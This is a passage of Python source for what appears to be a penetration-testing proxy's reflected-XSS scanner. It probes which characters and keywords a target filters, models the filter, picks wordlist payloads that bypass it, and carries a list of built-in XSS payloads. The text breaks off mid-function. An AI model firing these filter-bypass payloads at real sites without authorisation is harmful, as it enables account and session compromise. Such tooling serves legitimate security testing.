"""
XSS (Cross-Site Scripting) scan methods — Enhanced Reflected XSS Edition
=========================================================================

New in this version
───────────────────
1. PROBE PHASE  — sends special characters and dangerous keyword probes
                  individually before firing full payloads.
2. FILTER MODEL — analyses probe reflections to "imagine" what the target's
                  prevention code looks like (WAF, HTML encoder, keyword
                  stripper, quote escaper …).
3. SMART SELECT — reads a SecLists-style payload .txt file and greps only
                  the payloads that have a realistic chance of bypassing the
                  detected filter, instead of spraying every line blindly.
4. CONTEXT MAP  — improved _find_reflection_location with finer-grained
                  context detection (template literals, data-* attrs, …).
"""

import json
import logging
import os
import re
import html as html_module
import urllib.parse
import concurrent.futures
import time
from dataclasses import dataclass, field
from typing import Dict, Any, List, Optional, Tuple, Set
from collections import defaultdict

logger = logging.getLogger(__name__)

# ── Global settings path (same as hunt_gui.py and lfi_scan.py) ──────────────
_HUNT_SETTINGS_FILE = os.path.join(
    os.path.expanduser("~"), ".config", "hunt-proxy", "settings.json"
)

# Sub-directory inside PayloadsAllTheThings that holds XSS payloads
_PATT_XSS_SUBDIR = "XSS Injection"

# SecLists sub-directories used as fallback when PATT is not configured
_SECLISTS_XSS_SUBDIRS = [
    os.path.join("Fuzzing", "XSS", "robot-friendly"),
    os.path.join("Fuzzing", "XSS", "human-friendly"),
]


def _resolve_xss_payload_paths() -> List[str]:
    """
    Auto-discover XSS payload .txt files from:

    1. PayloadsAllTheThings (preferred):
           <patt_dir>/XSS Injection/**/*.txt
    2. SecLists (always collected alongside PATT when configured):
           <seclists_dir>/Fuzzing/XSS/robot-friendly/**/*.txt
           <seclists_dir>/Fuzzing/XSS/human-friendly/**/*.txt

    Both directories are read from settings.json saved by hunt_gui.py
    (Tools → Settings → PayloadsAllTheThings / Seclists Directory).

    Returns a deduplicated list of absolute file paths, sorted by name.
    Returns an empty list when neither directory is configured / found.
    """
    try:
        with open(_HUNT_SETTINGS_FILE, "r") as fh:
            settings = json.load(fh)
    except Exception:
        settings = {}

    paths: List[str] = []
    seen: Set[str]   = set()

    def _collect(base_dir: str) -> None:
        if not base_dir or not os.path.isdir(base_dir):
            return
        for root, _, files in os.walk(base_dir):
            for fname in sorted(files):
                if fname.lower().endswith(".txt") and fname.lower() != "xssdetection.txt":
                    full = os.path.normpath(os.path.join(root, fname))
                    if full not in seen:
                        seen.add(full)
                        paths.append(full)

    # 1. PayloadsAllTheThings
    patt_dir = settings.get("patt_dir", "").strip()
    if patt_dir:
        _collect(os.path.join(os.path.expanduser(patt_dir), _PATT_XSS_SUBDIR))
        if paths:
            logger.info(f"[XSS] Found {len(paths)} PATT payload file(s) under '{_PATT_XSS_SUBDIR}'")

    # 2. SecLists (always collected alongside PATT when configured)
    sl_dir = settings.get("seclists_dir", "").strip()
    if sl_dir:
        before = len(paths)
        for _subdir in _SECLISTS_XSS_SUBDIRS:
            _collect(os.path.join(os.path.expanduser(sl_dir), _subdir))
        added = len(paths) - before
        if added:
            logger.info(f"[XSS] Found {added} SecLists payload file(s) from robot-friendly / human-friendly")

    if not paths:
        logger.info("[XSS] No external payload files found — built-in payloads will be used")

    return paths


# ══════════════════════════════════════════════════════════════════════════════
# CONTEXT PRIORITY
# ══════════════════════════════════════════════════════════════════════════════

# Ordered from most-exploitable to least — used to pick the primary context
# when a parameter is reflected in multiple HTML/JS positions.
_CTX_PRIORITY: List[str] = [
    "script_template_literal",        # inside `...` in a <script> block
    "attribute_event_handler_double",  # inside onclick="..." value
    "attribute_event_handler_single",  # inside onclick='...' value
    "script_string_double",            # inside "..." JS string
    "script_string_single",            # inside '...' JS string
    "script",                          # general <script> block (not a string)
    "attribute_href",                  # href="HERE" — javascript: URI works
    "attribute_href_single",           # href='HERE'
    "attribute_double",                # generic attr="HERE"
    "attribute_single",                # generic attr='HERE'
    "attribute_unquoted",              # attr=HERE (no quotes)
    "style",                           # inside <style> block
    "html_body",                       # text node between HTML tags
    "html_comment",                    # inside <!-- ... -->
    "unknown",
]


def _dom_context(contexts: List[str]) -> str:
    """
    Return the highest-priority context from *contexts*.
    Falls back to the first entry, or 'unknown' if the list is empty.
    """
    for c in _CTX_PRIORITY:
        if c in contexts:
            return c
    return contexts[0] if contexts else "unknown"


# ══════════════════════════════════════════════════════════════════════════════
# DATA CLASSES
# ══════════════════════════════════════════════════════════════════════════════

@dataclass
class FilterModel:
    """
    Represents our best guess of what the server's XSS prevention code does.

    After the probe phase every boolean flag is set according to what we
    actually observed in reflected responses.  The model is then used to
    select payloads from a wordlist that are likely to survive the filter.
    """
    # ── Characters / tokens that were NOT reflected (blocked / stripped) ─────
    blocked_chars:    Set[str] = field(default_factory=set)   # '<', '>', '"', …
    blocked_keywords: Set[str] = field(default_factory=set)   # 'script', 'alert', …

    # ── Encoding transformations observed ────────────────────────────────────
    html_encodes_angle_brackets: bool = False   # < → &lt;  > → &gt;
    html_encodes_quotes:         bool = False   # " → &quot;  ' → &#x27;
    url_encodes_output:          bool = False   # < → %3C
    strips_on_keyword:           bool = False   # removes the word itself
    reflects_raw:                bool = True    # no filtering at all

    # ── Context where the param is reflected ─────────────────────────────────
    reflection_context:  str       = "unknown"  # primary (highest-priority) context
    reflection_contexts: List[str] = field(default_factory=list)  # ALL contexts found

    # ── Summary string for UI / logs ─────────────────────────────────────────
    description: str = ""

    def summarise(self) -> str:
        parts = []
        if self.html_encodes_angle_brackets:
            parts.append("HTML-encodes < >")
        if self.html_encodes_quotes:
            parts.append("HTML-encodes quotes")
        if self.url_encodes_output:
            parts.append("URL-encodes output")
        if self.strips_on_keyword:
            parts.append("strips dangerous keywords")
        if self.blocked_chars:
            parts.append(f"blocks chars: {', '.join(sorted(self.blocked_chars))}")
        if self.blocked_keywords:
            parts.append(f"blocks keywords: {', '.join(sorted(self.blocked_keywords))}")
        if not parts:
            return "No filtering detected — raw reflection"
        return "; ".join(parts)


# ══════════════════════════════════════════════════════════════════════════════
# SPECIAL-CHAR & KEYWORD PROBES
# ══════════════════════════════════════════════════════════════════════════════

# Characters sent one-by-one to see which ones survive
CHAR_PROBES: List[str] = [
    "<", ">", '"', "'", "`",
    "&", ";", "(", ")", "/",
    "\\", "{", "}", "=", ":",
    "%", "#", "!",
]

# Keywords that most WAFs / sanitisers target — sent individually
KEYWORD_PROBES: List[str] = [
    "script",
    "img",
    "svg",
    "iframe",
    "alert",
    "prompt",
    "confirm",
    "onerror",
    "onload",
    "onclick",
    "eval",
    "javascript",
    "expression",
    "vbscript",
    "data:",
    "srcdoc",
    "formaction",
    "autofocus",
    "onfocus",
    "onmouseover",
]


# ══════════════════════════════════════════════════════════════════════════════
# CONTEXT DETECTION HELPERS  (module-level)
# ══════════════════════════════════════════════════════════════════════════════

def _is_in_template_literal(js_fragment: str) -> bool:
    """
    Return True when *js_fragment* ends inside an open template literal.
    Handles escaped backticks correctly.
    """
    open_count = 0
    i = 0
    while i < len(js_fragment):
        c = js_fragment[i]
        if c == '\\':
            i += 2
            continue
        if c == '`':
            open_count += 1
        i += 1
    return (open_count % 2) == 1


def _js_string_quote(js_fragment: str) -> str:
    """
    Return the quote character ('"' or "'") if *js_fragment* ends inside an
    unfinished JS string literal, otherwise ''.
    Handles escaped quotes; ignores template literals.
    """
    in_single = False
    in_double = False
    i = 0
    while i < len(js_fragment):
        c = js_fragment[i]
        if c == '\\':
            i += 2
            continue
        if c == '`':
            i += 1
            continue
        if c == '"' and not in_single:
            in_double = not in_double
        elif c == "'" and not in_double:
            in_single = not in_single
        i += 1
    if in_single:
        return "'"
    if in_double:
        return '"'
    return ""


def _detect_single_context(body: str, idx: int, sentinel: str) -> str:
    """
    Determine the HTML/JS context of a single *sentinel* occurrence at
    position *idx* in *body*.  Returns one of the strings in _CTX_PRIORITY.
    """
    look_back = body[max(0, idx - 500): idx]

    # ── 1. Inside a <script> block ────────────────────────────────────────────
    last_script_open  = look_back.rfind("<script")
    last_script_close = look_back.rfind("</script")
    if last_script_open != -1 and last_script_open > last_script_close:
        script_region = look_back[last_script_open:]
        if _is_in_template_literal(script_region):
            return "script_template_literal"
        q = _js_string_quote(script_region)
        if q == "'":
            return "script_string_single"
        if q == '"':
            return "script_string_double"
        return "script"

    # ── 2. Inside a <style> block ─────────────────────────────────────────────
    last_style_open  = look_back.rfind("<style")
    last_style_close = look_back.rfind("</style")
    if last_style_open != -1 and last_style_open > last_style_close:
        return "style"

    # ── 3. Inside an HTML comment ─────────────────────────────────────────────
    last_cmt_open  = look_back.rfind("<!--")
    last_cmt_close = look_back.rfind("-->")
    if last_cmt_open != -1 and last_cmt_open > last_cmt_close:
        return "html_comment"

    # ── 4. Inside an HTML tag ─────────────────────────────────────────────────
    last_tag_open  = look_back.rfind("<")
    last_tag_close = look_back.rfind(">")
    if last_tag_open != -1 and last_tag_open > last_tag_close:
        tag_frag = look_back[last_tag_open:]

        # Event-handler attribute values
        if re.search(r'\bon\w+\s*=\s*"[^"]*$', tag_frag, re.IGNORECASE):
            return "attribute_event_handler_double"
        if re.search(r"\bon\w+\s*=\s*'[^']*$", tag_frag, re.IGNORECASE):
            return "attribute_event_handler_single"

        # URL-bearing attributes (href / src / action / formaction / data)
        if re.search(r'\b(?:href|src|action|formaction|data)\s*=\s*"[^"]*$',
                     tag_frag, re.IGNORECASE):
            return "attribute_href"
        if re.search(r"\b(?:href|src|action|formaction|data)\s*=\s*'[^']*$",
                     tag_frag, re.IGNORECASE):
            return "attribute_href_single"

        # Generic double-quoted attribute
        if re.search(r'=\s*"[^"]*$', tag_frag):
            return "attribute_double"
        # Generic single-quoted attribute
        if re.search(r"=\s*'[^']*$", tag_frag):
            return "attribute_single"
        # Unquoted attribute value
        if re.search(r'=(?!["\'])\S*$', tag_frag):
            return "attribute_unquoted"

        # Inside the tag but not in an attribute value
        return "html_body"

    # ── 5. Text node between HTML tags ────────────────────────────────────────
    return "html_body"


def _detect_all_reflection_contexts(body: str, sentinel: str) -> List[str]:
    """
    Find ALL positions where *sentinel* appears in *body* and return the
    deduplicated list of reflection contexts (ordered by first occurrence).
    """
    ctxs: List[str] = []
    start = 0
    while True:
        idx = body.find(sentinel, start)
        if idx == -1:
            break
        ctx = _detect_single_context(body, idx, sentinel)
        if ctx not in ctxs:
            ctxs.append(ctx)
        start = idx + len(sentinel)
    return ctxs if ctxs else ["unknown"]


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD SELECTOR
# ══════════════════════════════════════════════════════════════════════════════

class PayloadSelector:
    """
    Reads a SecLists-style XSS payload text file and returns only those
    payloads that are compatible with the observed FilterModel.

    Each line of the file is treated as one payload.  Lines starting with '#'
    or that are blank are ignored.
    """

    def __init__(self, wordlist_path: str):
        self.wordlist_path = wordlist_path
        self._raw: List[str] = []
        self._loaded = False

    # ── Load ──────────────────────────────────────────────────────────────────
    def _load(self) -> None:
        if self._loaded:
            return
        try:
            with open(self.wordlist_path, "r", encoding="utf-8", errors="replace") as fh:
                self._raw = [
                    line.rstrip("\n\r")
                    for line in fh
                    if line.strip() and not line.startswith("#")
                ]
            self._loaded = True
            logger.info(f"[PayloadSelector] Loaded {len(self._raw)} payloads from {self.wordlist_path}")
        except FileNotFoundError:
            logger.warning(f"[PayloadSelector] Wordlist not found: {self.wordlist_path}")
            self._raw = []
            self._loaded = True

    # ── Alternative constructor: load from multiple files ─────────────────────
    @classmethod
    def from_paths(cls, paths: List[str]) -> "PayloadSelector":
        """
        Create a PayloadSelector pre-loaded from a list of .txt files.

        Payloads are merged across all files and deduplicated (first-seen wins).
        Lines that are blank or start with '#' are skipped.

        Typical use: pass the list returned by _resolve_xss_payload_paths() to
        load all XSS payload files discovered in PayloadsAllTheThings / SecLists.
        """
        inst = cls.__new__(cls)
        inst.wordlist_path = f"<multi: {len(paths)} file(s)>"
        inst._loaded       = True
        seen: Set[str]     = set()
        raw:  List[str]    = []

        for p in paths:
            try:
                with open(p, "r", encoding="utf-8", errors="replace") as fh:
                    for line in fh:
                        s = line.rstrip("\n\r")
                        if s and not s.startswith("#") and s not in seen:
                            seen.add(s)
                            raw.append(s)
            except Exception as exc:
                logger.warning(f"[PayloadSelector] Could not read '{p}': {exc}")

        inst._raw = raw
        logger.info(
            f"[PayloadSelector] Loaded {len(raw)} unique payloads "
            f"from {len(paths)} file(s)"
        )
        return inst

    # ── Public API ────────────────────────────────────────────────────────────
    def select(self, model: FilterModel, max_payloads: int = 200) -> List[str]:
        """
        Return at most *max_payloads* lines from the wordlist that are
        plausibly able to bypass the given FilterModel.

        Strategy
        ────────
        A payload is *excluded* when it contains a character or keyword that
        the server was observed to block/strip AND no obvious bypass encoding
        is present in the same payload.
        """
        self._load()
        if not self._raw:
            return []

        selected: List[str] = []

        for payload in self._raw:
            if self._survives_filter(payload, model):
                selected.append(payload)
            if len(selected) >= max_payloads:
                break

        logger.info(
            f"[PayloadSelector] Selected {len(selected)} / {len(self._raw)} "
            f"payloads for context='{model.reflection_context}'"
        )
        return selected

    # ── Internal helpers ──────────────────────────────────────────────────────
    @staticmethod
    def _survives_filter(payload: str, model: FilterModel) -> bool:
        """
        Return True when *payload* has a realistic chance of surviving the
        filter described by *model* and producing a useful reflection.

        Design principles
        ─────────────────
        1. Exclusions are based on OBSERVED server behaviour, not guesses.
           Only reject a payload when the probe phase confirmed the server
           will transform or remove the required character/keyword.

        2. HTML-encoding and blocked_chars are handled uniformly.
           Both mean "the raw character will not reach the browser as-is".
           A payload that contains `<` will fail if the server either
           html_encodes_angle_brackets OR has `<` in blocked_chars —
           UNLESS the payload uses an already-encoded form of that character
           (e.g. %3C, &#60;, &lt;) that may survive.

        3. Keyword filtering uses realistic obfuscation awareness:
           • Case variation:        ScRiPt, SCRIPT
           • Character insertion:   scr ipt, sc/ript, sc\\ript
           • Entity mid-word:       scr&#105;pt, scr\u0069pt
           • Null-byte:             scr\\x00ipt
           If a payload uses any of these for a blocked keyword, it passes.

        4. Context-based filtering adds extra precision — in a script
           context we prefer JS-only payloads; in an attribute context
           we prefer attribute-breaker payloads.  But we do NOT hard-reject
           other payloads — they are just deprioritised (caller can sort).
        """
        stripped  = payload.strip()
        pl_lower  = payload.lower()

        # ── Sanity / noise filtering ─────────────────────────────────────────
        if len(stripped) < 4:
            return False
        # Bare event-handler names (enumeration lists in PATT, not payloads)
        if re.match(r'^on[A-Za-z]+$', stripped):
            return False
        # Section markers like "[B]"
        if re.match(r'^\[[A-Za-z0-9]\]$', stripped):
            return False
        # Plain camelCase function name with no invocation
        if re.match(r'^[a-z][A-Za-z]{4,}$', stripped) and '(' not in stripped:
            return False

        # ── Helper: does this payload contain the raw char AND no bypass? ─────
        def _char_blocked_raw(ch: str) -> bool:
            """True when the server will eat `ch` and the payload has no bypass."""
            if ch not in payload:
                return False   # payload doesn't use this char at all — fine
            pl_l = payload.lower()
            # Accepted bypass encodings
            bypasses = {
                "<":  ["%3c", "&#60;", "&#x3c;", "&lt;", "\\u003c", "\\x3c"],
                ">":  ["%3e", "&#62;", "&#x3e;", "&gt;", "\\u003e", "\\x3e"],
                '"':  ["%22", "&#34;", "&#x22;", "&quot;", "\\u0022", "\\x22"],
                "'":  ["%27", "&#39;", "&#x27;", "&apos;", "\\u0027", "\\x27"],
                "`":  ["%60", "&#96;", "&#x60;", "\\u0060", "\\x60"],
                "(":  ["%28", "&#40;",  "&#x28;", "\\u0028", "\\x28"],
                ")":  ["%29", "&#41;",  "&#x29;", "\\u0029", "\\x29"],
            }
            for enc in bypasses.get(ch, []):
                if enc in pl_l:
                    return False   # bypass encoding present — might survive
            return True            # raw char, no bypass → will be eaten

        # ── 1. Characters the server HTML-encodes ─────────────────────────────
        # If the server HTML-encodes angle brackets, any payload that RELIES
        # on raw `<` or `>` to be effective will not work.
        # We say "relies on" = contains the raw character without a bypass encoding.
        if model.html_encodes_angle_brackets:
            if _char_blocked_raw("<") or _char_blocked_raw(">"):
                return False

        # ── 2. Characters the server HTML-encodes (quotes) ────────────────────
        if model.html_encodes_quotes:
            if _char_blocked_raw('"') or _char_blocked_raw("'"):
                # Only reject if the payload REQUIRES quotes to break out.
                # Payloads that use backtick or no quotes at all still survive.
                if "`" not in payload:
                    return False

        # ── 3. URL-encoding: rare case — server URL-encodes the output ────────
        if model.url_encodes_output:
            # Most HTML-tag-based payloads won't work; JS-only ones might.
            # Keep only payloads that don't start with < and don't rely on
            # angle brackets to inject a tag.
            if "<" in payload and _char_blocked_raw("<"):
                return False

        # ── 4. Hard-blocked characters (server removes/rejects them) ──────────
        for ch in model.blocked_chars:
            if _char_blocked_raw(ch):
                return False

        # ── 5. Blocked keywords — with realistic bypass awareness ──────────────
        for kw in model.blocked_keywords:
            if kw not in pl_lower:
                continue  # payload doesn't use this keyword — fine

            # Build a list of obfuscated representations of kw and check
            # whether any appear in the payload.
            found_bypass = False

            # a) Case variation — any char capitalised differently from lowercase kw
            #    We check that the payload's version of the keyword is NOT identical
            #    to the lowercase kw (i.e. at least one char differs in case).
            kw_re = re.compile(re.escape(kw), re.IGNORECASE)
            for m in kw_re.finditer(payload):
                if m.group(0) != kw:          # e.g. "Script" or "SCRIPT"
                    found_bypass = True
                    break

            if not found_bypass:
                # b) Character insertion between keyword letters
                #    e.g. sc/ript, sc ript, sc\x00ript, scr&#105;pt
                insertion_re = re.compile(
                    r'(?i)' + r'.{0,3}'.join(re.escape(c) for c in kw)
                )
                # Only match when the "inserted" chars actually differ from kw
                for m in insertion_re.finditer(payload):
                    if m.group(0).lower().replace(" ", "").replace("/", "").replace(
                            "\x00", "").replace("\t", "") == kw:
                        # Has junk chars inserted
                        if len(m.group(0)) > len(kw):
                            found_bypass = True
                            break

            if not found_bypass:
                # c) Entity encoding inside keyword: &#NNN; or &#xNN; anywhere
                if "&#" in payload or "\\u" in payload or "\\x" in payload:
                    found_bypass = True

            if not found_bypass:
                # Payload contains the raw blocked keyword with no obfuscation
                return False

        # ── 6. Context-aware filtering — union across ALL detected contexts ───
        # Get all contexts where this parameter was reflected.
        # A payload passes if it is effective in at least ONE context.
        contexts = (list(getattr(model, 'reflection_contexts', None) or [])
                    or [model.reflection_context])

        def _fits_context(ctx: str) -> bool:  # noqa: C901
            """Return True if *payload* is useful/executable in *ctx*."""

            if ctx == "html_body":
                # By the time we reach section 6, sections 1–5 already confirmed
                # that the payload's chars survive the server filter.
                # Here we only ask: "does this payload attempt tag injection
                # or a javascript: URI?" — the right approach for html_body.
                return ("<" in payload
                        or any(e in pl_lower for e in ["&#60;", "%3c", "\\u003c"])
                        or "javascript:" in pl_lower)

            elif ctx == "script_template_literal":
                # Inside `...` — inject ${expr} without closing the literal.
                return ("${" in payload and any(
                    s in pl_lower for s in [
                        "alert", "prompt", "confirm", "eval",
                        "document", "window", "fetch", "location",
                    ]
                ))

            elif ctx == "script_string_single":
                # Inside '...' JS string — must break out with ' or bypass.
                js_sinks = ["alert", "prompt", "confirm", "eval",
                            "document", "fetch", "location", "window"]
                if not any(s in pl_lower for s in js_sinks):
                    return False
                # Break strategies: raw quote, backslash-escaped quote, unicode, entity.
                # ${...} is NOT included — it only works inside template literals.
                return ("'" in payload
                        or "\\'" in payload
                        or "\\u0027" in pl_lower
                        or "&apos;" in pl_lower)

            elif ctx == "script_string_double":
                # Inside "..." JS string — break with " or bypass.
                js_sinks = ["alert", "prompt", "confirm", "eval",
                            "document", "fetch", "location", "window"]
                if not any(s in pl_lower for s in js_sinks):
                    return False
                # ${...} not included — only works inside template literals.
                return ('"' in payload
                        or '\\"' in payload
                        or "\\u0022" in pl_lower
                        or "&quot;" in pl_lower)

            elif ctx == "script":
                # General <script> context (code, not inside a string).
                # Either call a JS sink directly or close the script tag.
                js_sinks = [
                    "alert", "prompt", "confirm", "eval", "document", "window",
                    "fetch(", "location", "cookie", "innerhtml", "outerhtml",
                    "write(", "writeln(", "${", "throw",
                ]
                return (any(s in pl_lower for s in js_sinks)
                        or "</script>" in pl_lower)

            elif ctx in ("attribute_event_handler_double",
                         "attribute_event_handler_single"):
                # Already inside an event-handler value; browser HTML-decodes
                # before JS runs, so &apos; / &quot; entities work here.
                js_sinks = [
                    "alert", "prompt", "confirm", "eval", "document",
                    "window", "fetch", "location", "throw",
                    "&apos;", "&quot;", "&#x27;", "&#39;", "&#x22;",
                    "'-", '"-', "';", '";',
                ]
                return any(s in pl_lower for s in js_sinks)

            elif ctx in ("attribute_href", "attribute_href_single"):
                # href/src/action — javascript: and data: URIs work directly.
                if "javascript:" in pl_lower or "data:" in pl_lower:
                    return True
                # Alternatively break out of the attribute with the right quote.
                quote = '"' if ctx == "attribute_href" else "'"
                return (quote in payload
                        and any(h in pl_lower for h in [
                            "onerror", "onfocus", "onload", "script",
                            "onmouse", "alert", "prompt",
                        ]))

            elif ctx == "attribute_double":
                # Inside a double-quoted attribute value.
                # Break out with " and inject event handler / new tag;
                # or (if angle brackets blocked) inject handler inside the tag.
                attr_sinks = [
                    "onerror", "onfocus", "onmouseover", "onload", "onclick",
                    "onkeyup", "autofocus", "ontoggle", "onpointer", "onmouse",
                ]
                return '"' in payload or any(b in pl_lower for b in attr_sinks)

            elif ctx == "attribute_single":
                # Inside a single-quoted attribute value.
                attr_sinks = [
                    "onerror", "onfocus", "onmouseover", "onload", "onclick",
                    "onkeyup", "autofocus", "ontoggle", "onpointer", "onmouse",
                ]
                return "'" in payload or any(b in pl_lower for b in attr_sinks)

            elif ctx == "attribute_unquoted":
                # Unquoted attribute — space or > breaks out.
                return any(h in pl_lower for h in [
                    "onerror", "onfocus", "onmouseover", "onload", "onclick",
                    "autofocus", "ontoggle", "alert", "prompt",
                ]) or ">" in payload

            elif ctx == "html_comment":
                # Must close the comment first.
                return "-->" in payload or "--!>" in payload or "]]>" in payload

            elif ctx == "style":
                # Close the style block, or use CSS expression / @import.
                return ("</style>" in pl_lower
                        or "expression(" in pl_lower
                        or "@import" in pl_lower)

            # unknown — be permissive
            return True

        if not any(_fits_context(ctx) for ctx in contexts):
            return False

        return True


# ══════════════════════════════════════════════════════════════════════════════
# MAIN MIXIN
# ══════════════════════════════════════════════════════════════════════════════

class XssScanMixin:
    """Mixin providing XSS (Cross-Site Scripting) scan methods — enhanced edition."""

    # ── Built-in fallback payloads (used when no wordlist is configured) ──────
    _BUILTIN_PAYLOADS: List[str] = [
        # Basic probes
        '<', '>', '"', "'",
        # Script tags
        '<script>alert(1)</script>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<Script>alert(1)</Script>',
        # javascript: URI
        'javascript:alert(1)',
        'JAVASCRIPT:alert(1)',
        'java\tscript:alert(1)',
        # Event handlers — angle-bracket-free
        '" onmouseover=alert(1) "',
        "' onmouseover=alert(1) '",
        '"><img src=x onerror=alert(1)>',
        "'><img src=x onerror=alert(1)>",
        # Void elements
        '<img src=x onerror=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<details open ontoggle=alert(1)>',
        # SVG
        '<svg/onload=alert(1)>',
        '<svg><script>alert(1)</script>',
        '<svg onload=alert(1)>',
        # Template / backtick
        '`><img src=x onerror=alert(1)>',
        # Encoded angle brackets
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        # Keyword obfuscation — split
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        # Polyglots
        'jaVasCript:alert(1)',
        '"`><script>alert(1)</script>',
        # iframe
        '<iframe src=javascript:alert(1)>',
        '<iframe srcdoc="<script>alert(1)</script>">',
        # CSS / style
        '<style>@import"javascript:alert(1)";</style>',
        # prompt / confirm alternatives
        '<img src=x onerror=prompt(1)>',
        '<img src=x onerror=confirm(1)>',
        # data: URI
        '<object data="data:text/html,<script>alert(1)</script>">',
        # Null-byte
        '<scr\x00ipt>alert(1)</scr\x00ipt>',
        # Body / global events
        '<body onload=alert(1)>',
        '<body onpageshow=alert(1)>',
        # Anchor
        '<a href=javascript:alert(1)>click</a>',
        # Form action
        '<form><button formaction=javascript:alert(1)>click',
        # Video / audio
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        # template literal in script context
        '${alert(1)}',
        '\\u0022><script>alert(1)</script>',
        # HTML5 new events
        '<marquee onstart=alert(1)>',
        '<meter value=2 min=0 max=10 onmouseover=alert(1)>2</meter>',
    ]

    # ══════════════════════════════════════════════════════════════════════════
    # PUBLIC ENTRY POINT
    # ══════════════════════════════════════════════════════════════════════════

    def scan_xss(self) -> Dict[str, Any]:
        """
        Full reflected-XSS scan pipeline:

        Phase 1 — PROBE   : Send char & keyword probes per injection point.
        Phase 2 — MODEL   : Build FilterModel from probe responses.
        Phase 3 — SELECT  : Choose payloads from wordlist (or builtins) that
                            fit the model.
        Phase 4 — ATTACK  : Fire selected payloads, record reflections.
        """
        self.scan_progress.emit("🔍 Starting Enhanced Reflected XSS Scan …")

        results: Dict[str, Any] = {
            "scan_type": "XSS",
            "vulnerable": False,
            "reflected_payloads": [],
            "details": [],
            "summary": "",
            "detection_methods": [],
            "filter_models": {},      # param_name → FilterModel.summarise()
            "payload_sources": [],   # payload file paths used
        }

        if self.boost_mode:
            self.scan_progress.emit("⚡ BOOST MODE: parallel requests enabled")

        try:
            full_url = self.request_data.get("url", "")
            if not full_url:
                return {"error": "No URL provided"}

            parsed        = urllib.parse.urlparse(full_url)
            params        = urllib.parse.parse_qs(parsed.query)
            request_text  = self.request_data.get("request_text", "")
            wordlist_path = self.request_data.get("xss_wordlist", "")

            # ── Resolve PATT / SecLists payload files (once per scan) ─────────
            # Only done when no explicit wordlist was supplied via request_data.
            _auto_paths: List[str] = _resolve_xss_payload_paths() if not wordlist_path else []
            if wordlist_path:
                self.scan_progress.emit(f"📄 Payload file: {wordlist_path}")
                results["payload_sources"].append(wordlist_path)
            elif _auto_paths:
                self.scan_progress.emit(
                    f"📁 Auto-resolved {len(_auto_paths)} payload file(s) "
                    f"from PayloadsAllTheThings / SecLists"
                )
                for _p in _auto_paths:
                    self.scan_progress.emit(f"   • {_p}")
                results["payload_sources"].extend(_auto_paths)

            # ── Parse raw request ─────────────────────────────────────────────
            (method, headers, cookies,
             body_params, body_content,
             is_json_body) = self._parse_raw_request(request_text, parsed)

            # ── Identify injection points ─────────────────────────────────────
            import re as _re
            _ID_RE = _re.compile(
                r'^(?:\d+'
                r'|[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}'
                r'-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
                r'|[0-9a-fA-F]{24,}'
                r'|[A-Za-z0-9_-]{8,}'
                r'|v\d+(?:\.\d+)*)$'
            )
            path_segments     = [s for s in parsed.path.split("/") if s]
            testable_path_segs = [(i, s) for i, s in enumerate(path_segments) if _ID_RE.match(s)]

            SKIP_HDR = {"host", "content-length", "transfer-encoding",
                        "connection", "accept-encoding", "cookie"}
            testable_headers = {k: v for k, v in headers.items() if k.lower() not in SKIP_HDR}

            tested_url     = [n for n in params        if self._is_forced_point("url",    n)]
            tested_body    = [n for n in body_params   if self._is_forced_point("body",   n)]
            tested_cookies = [n for n in cookies       if self._is_forced_point("cookie", n)]
            tested_headers = [k for k in testable_headers if self._is_forced_point("header", k)]
            tested_path    = [(i, s) for i, s in testable_path_segs
                              if self._is_forced_point("path", f"{i}:{s}")]

            total_points = (len(tested_url) + len(tested_body) +
                            len(tested_cookies) + len(tested_headers) + len(tested_path))

            if total_points == 0:
                return {
                    "scan_type": "XSS",
                    "vulnerable": False,
                    "details": ["No injection points selected or found to test"],
                    "summary": "No injection points to test",
                }

            self.scan_progress.emit(
                f"Injection points → URL: {len(tested_url)}, "
                f"Body: {len(tested_body)}, Cookies: {len(tested_cookies)}, "
                f"Headers: {len(tested_headers)}, Path: {len(tested_path)}"
            )

            # ── Helper: build a sender for a given point ──────────────────────
            def make_sender(point_type: str, probe_mode: bool = False, **ctx):
                """
                Return a callable(payload) → response|None.
                probe_mode=True  → traffic tab shows  XSS-Probe-*  (Phase 1+2)
                probe_mode=False → traffic tab shows  XSS-*        (Phase 4 attack)
                """
                pfx = "XSS-Probe" if probe_mode else "XSS"
                if point_type == "url":
                    def sender(payload):
                        return self._send_url_probe(
                            params, ctx["param_name"], payload,
                            parsed, headers, full_url, type_prefix=pfx
                        )
                elif point_type == "body":
                    def sender(payload):
                        return self._send_post_probe(
                            body_params, ctx["param_name"], payload,
                            headers, full_url, is_json=is_json_body, type_prefix=pfx
                        )
                elif point_type == "cookie":
                    def sender(payload):
                        return self._send_cookie_probe(
                            cookies, ctx["param_name"], payload,
                            headers, full_url, method, body_params, body_content,
                            type_prefix=pfx
                        )
                elif point_type == "header":
                    def sender(payload):
                        return self._send_header_probe(
                            ctx["header_name"], payload, headers,
                            full_url, method, body_params, body_content,
                            type_prefix=pfx
                        )
                elif point_type == "path":
                    def sender(payload):
                        return self._send_path_probe(
                            ctx["seg_idx"], payload, path_segments,
                            parsed, headers, full_url, type_prefix=pfx
                        )
                else:
                    def sender(payload):
                        return None
                return sender

            point_index = 0

            # ════════════════════════════════════════════════════════════════
            # ITERATE INJECTION POINT GROUPS
            # ════════════════════════════════════════════════════════════════

            # Store (label, param_name, point_type, ctx_kwargs) so we can build
            # separate probe_sender / attack_sender per group.
            groups = []
            for pn in tested_url:
                groups.append(("URL Parameter", pn, "url",    {"param_name": pn}))
            for pn in tested_body:
                lbl = "JSON Body" if is_json_body else "POST Body"
                groups.append((lbl,             pn, "body",   {"param_name": pn}))
            for cn in tested_cookies:
                groups.append(("Cookie",        cn, "cookie", {"param_name": cn}))
            for hn in tested_headers:
                groups.append(("HTTP Header",   hn, "header", {"header_name": hn}))
            for si, sv in tested_path:
                groups.append((f"Path[{si}]", f"path[{si}]", "path", {"seg_idx": si}))

            for location_label, param_name, point_type, pt_ctx in groups:
                if not self.running:
                    break

                point_index += 1
                self.scan_progress.emit(
